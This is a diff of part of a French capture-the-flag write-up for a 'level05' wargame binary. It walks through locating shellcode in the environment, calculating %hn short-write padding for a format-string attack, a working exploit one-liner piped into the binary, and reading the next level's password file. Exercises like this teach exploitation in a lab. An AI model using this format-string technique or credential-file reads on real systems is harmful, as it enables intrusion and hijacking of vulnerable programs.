@@ -27,9 +27,9 @@ gcc -m32 /tmp/getenv.c -o /tmp/getenv
 /tmp/getenv SHELLCODE
 # Exemple de retour : 0xffffd884
 
-💻 ÉTAPE 5 : CALCULS D'EXPLOITTechnique du Short Write (%hn) en deux parties :CibleValeur (Hex)Valeur (Déc)Calcul du Padding0x080497e00xd88455428$55428 - 8 = 55420$0x080497e20xffff65535$65535 - 55428 = 10107$🚀 ÉTAPE 6 : L'EXPLOIT ONE-LINERBash
+💻 ÉTAPE 5 : CALCULS D'EXPLOIT Technique du Short Write (%hn) en deux parties :CibleValeur (Hex)Valeur (Déc)Calcul du Padding0x080497e00xd88455428$55428 - 8 = 55420$0x080497e20xffff65535$65535 - 55428 = 10107$🚀 ÉTAPE 6 : L'EXPLOIT ONE-LINERBash
 (python -c "import sys; sys.stdout.write('\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%55420x%10\$hn' + '%10107x%11\$hn')"; cat) | ./level05
 
 
-🏁 ÉTAPE 7 : OBTENTION DU FLAGBashwhoami # doit afficher level06
+🏁 ÉTAPE 7 : OBTENTION DU FLAG
 cat /home/users/level06/.pass
